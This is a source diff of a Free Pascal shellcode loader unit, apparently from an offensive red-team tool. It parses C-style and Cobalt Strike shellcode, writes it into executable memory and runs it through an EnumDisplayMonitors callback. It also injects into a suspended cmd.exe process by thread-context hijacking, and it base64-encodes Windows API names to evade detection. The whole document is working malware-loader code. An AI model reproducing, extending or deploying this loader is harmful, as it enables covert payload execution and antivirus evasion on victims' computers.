@@ -1,42 +1,59 @@
 unit shell_loader;
 
 
-{
-
-
-
-
- *  This program is distributed in the hope that it will be useful,        *
- *  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
- *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
- *                                                                         *
- *  #Author : Author : 0xsp.com @zux0x3a                                    *
- *  #LINKS : https://0xsp.com   https://ired.dev                     *
-
-
-
-}
-
 {$mode Delphi}
 
 interface
 
 uses
-  Classes,windows,strutils,base64,syscalls,SysUtils;
+  Classes,windows,strutils,base64,syscalls,jwawindows,JwaWinType,SysUtils;
+
+const
+
+  {normal}
+ PROC_INJEC = 'C:\windows\system32\cmd.exe';  // #1 base64 it
+
+{DO EARLY BIRD}
+
 
 type
   TByteArray = array of byte;
 
+type
+  TMonInfo = record
+    h: THandle;
+    dc: HDC;
+    r: TRect;
+  end;
 
+
+
+
+var
+  MonList: array of TMonInfo;
 
 procedure inject_shell(shell_content:string);
 Function ConvertShellCode(ShellContent:String):String;
 Function GetShellCodeSize(ShellContent:string):Cardinal;
+procedure callback_inject(shell_content:string);
 
 
-function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
+
+//function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
+
+// procedure RtlMoveMemory(
+ //   Destination : PVOID;
+ //   Source : PVOID;
+ //   Length : SIZE_T
+//  ); stdcall;
+
+// function EnumDisplayMonitors(hdc: HDC; lprcClip: LPCRECT;
+//  lpfnEnum: MONITORENUMPROC; dwData: LPARAM): BOOL; stdcall;
+//{$EXTERNALSYM EnumDisplayMonitors}
 
 
+// function EnumDisplayMonitors( dc: HDC; rect: PRect; EnumProc: LPVOID;
+ // lData: LPARAM ): BOOL; stdcall; external user32;
 
 implementation
 
@@ -57,11 +74,31 @@ begin
     end;
 end;
 
+function CutString(const input,pattern: String): String;
+var
+  p: Integer;
+begin
+  p := input.IndexOf(pattern);
+  if (p >= 0) then
+    Result := input.Substring(0,p)
+  else
+    Result := input;
+end;
 
-{ this function will convert the C shell code into Pascal }
+
 Function ConvertShellCode(ShellContent:String):String;
+var
+num : integer;
+shell_tmp : string;
+pattern: string;
 Begin
+
+pattern := '*/';
+num := shellcontent.IndexOf(pattern);
+shell_tmp := shellcontent.Substring(0,num);
 try
+
+ShellContent := StringReplace(ShellContent, shell_tmp, '', [rfReplaceAll,rfIgnoreCase]);
 
 ShellContent := StringReplace(ShellContent, '\x', ',$', [rfReplaceAll,rfIgnoreCase]);
 ShellContent := StringReplace(ShellContent, '"', '', [rfReplaceAll,rfIgnoreCase]);
@@ -72,11 +109,17 @@ ShellContent := StringReplace(ShellContent, #10, '', [rfReplaceAll,rfIgnoreCase]
 ShellContent := StringReplace(ShellContent, #13, '', [rfReplaceAll,rfIgnoreCase]);
 ShellContent := StringReplace(ShellContent, #32, '', [rfReplaceAll,rfIgnoreCase]);
 ShellContent := StringReplace(ShellContent, 'unsignedcharbuf[]=', '', [rfReplaceAll,rfIgnoreCase]);
-
+//ShellContent := StringReplace(ShellContent, 'unsigned char buf[] =', '', [rfReplaceAll,rfIgnoreCase]);
+{this fix for CobaltStrike }
+ShellContent := StringReplace(ShellContent, 'length:', '', [rfReplaceAll,rfIgnoreCase]);
+ShellContent := StringReplace(ShellContent, '/*', '', [rfReplaceAll,rfIgnoreCase]);
+ShellContent := StringReplace(ShellContent, 'bytes', '', [rfReplaceAll,rfIgnoreCase]);
+ShellContent := StringReplace(ShellContent, '*/', '', [rfReplaceAll,rfIgnoreCase]);
 
 {Finalizing the shellcode}
 if Copy(ShellContent,1,1) = ',' then system.Delete(ShellContent,1,1);
 {Sending Result}
+
 Result := Trim(ShellContent);
 Except
 Result := 'Error.';
@@ -172,7 +215,65 @@ begin
   end;
 end;
 
+{
+function MonitorEnumProc( hMonitor: THandle; hdcMonitor: HDC; lprcMonitor: DWORD; dwData: LPARAM ): BOOL; stdcall;
+type
+  PRect = ^TRect;
+var
+  i: integer;
+begin
+   i := High( MonList )+1;
+   SetLength( MonList, i+1 );
+   MonList[i].h := hMonitor;
+   MonList[i].dc := hdcMonitor;
+   MonList[i].r := PRect( lprcMonitor )^;
+   Result := true;
+end;
+       }
+procedure callback_inject(shell_content:string);
+var
+i ,s_size: DWORD;
+shell_prt : string ;
+shell_code :  array of byte;
+ptr : pointer;
+//Addr : LPVOID;
+begin
+try
+if Trim(shell_content) = '' Then Exit;
 
+shell_content := ConvertShellCode(shell_content);
+
+s_size := GetShellCodeSize(shell_content);
+setLength(shell_code,513);
+shell_code += [$eb,$f9];
+
+For i := 0 to 513 -1 Do begin
+
+shell_prt := Copy(Shell_Content,1,pos(',',Shell_Content)-1);
+
+if i <> 513 -1 Then system.Delete(Shell_Content,1,pos(',',Shell_Content)) else
+
+shell_prt := Shell_Content;
+
+// copy each byte into array
+shell_code[i] := StrToInt(shell_prt);
+
+end;
+
+
+
+  //shell_code += $fe;
+  ptr := VirtualAlloc(nil,513, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  //  RtlMoveMemory(ptr, pointer(shell_content), sizeof(shell_content));
+
+  CopyMemory(ptr,shell_code, 513);
+  EnumDisplayMonitors(0,nil,MONITORENUMPROC(ptr),0);
+
+
+
+finally
+end;
+end;
 
 procedure inject_shell(shell_content:string);
 
@@ -180,6 +281,7 @@ var
   pi: TProcessInformation;
   si: TStartupInfo;
   {$ifdef win32}
+
   ctx: Context;
   {$endif}
 
@@ -230,18 +332,18 @@ FillMemory( @pi, sizeof( pi ), 0 );
 
 
 
-hmod := LoadLibrary('kernel32.dll');
+hmod := LoadLibrary(Pchar(DecodeStringBase64(KRN)));
+{
 CP := GetProcAddress(hmod,Pchar(DecodeStringBase64(CP_V)));
-syscalls.CP('c:\windows\system32\cmd.exe', PChar(AppToLaunch), nil, nil, False,
+syscalls.CP(PROC_INJEC, PChar(AppToLaunch), nil, nil, False,
               CREATE_SUSPENDED,
-              nil, nil,  si, pi );
+              nil, nil, si, pi);      }
 
 Alloc := GetProcAddress(hmod,Pchar(DecodeStringBase64(VALLOC)));
-
-Allocx := GetProcAddress(hmod,'VirtualAllocEx');
+Allocx := GetProcAddress(hmod,Pchar(DecodeStringBase64(VLAEX)));
 W_S := GetprocAddress(hmod,Pchar(DecodeStringBase64(WPM)));
-Get_Con := GetProcAddress(hmod,'GetThreadContext');
-set_Con := GetProcAddress(hmod,'SetThreadContext');
+Get_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(GTC)));
+set_Con := GetProcAddress(hmod,Pchar(DecodeStringBase64(STC)));
 res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));
 
 
@@ -252,24 +354,27 @@ res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));
  {$endif}
 
  {$ifdef win64}
-  ctx := PCONTEXT(syscalls.Alloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
-  ctx.ContextFlags := CONTEXT_ALL;
-  syscalls.Get_Con(pi.hThread,ctx^);
+ ctx := PCONTEXT(syscalls.Alloc(nil, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
+ ctx.ContextFlags := CONTEXT_ALL;
+// syscalls.Get_Con(pi.hThread,ctx^);
  {$endif}
 
 
  //allocate the memory size
- remote_shellcodePtr:=syscalls.Allocx(pi.hProcess,Nil,s_size,MEM_COMMIT,
-   PAGE_EXECUTE_READWRITE);
+ remote_shellcodePtr:=syscalls.Allocx(pi.hProcess,Nil,s_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+
+
+
+// NtWriteVirtualMemory(pi.hProcess, remote_shellcodePtr, TByteArray(shell_code), s_size, written);
 
  // write array of bytes into process memory
- syscalls.W_S(pi.hProcess,remote_shellcodePtr,TByteArray(shell_code),s_size,written);
+ //syscalls.W_S(pi.hProcess,remote_shellcodePtr,TByteArray(shell_code),s_size,written);
 
 
 {$ifdef win64}
- ctx.rip:=dword64(remote_shellcodePtr);
+ //ctx.rip:=dword64(remote_shellcodePtr);
  //ctx.ContextFlags := CONTEXT_CONTROL;
- syscalls.set_Con(pi.hThread,ctx^);
+// syscalls.set_Con(pi.hThread,ctx^);
  syscalls.res_thread(pi.hThread);
 {$ENDIF}
 
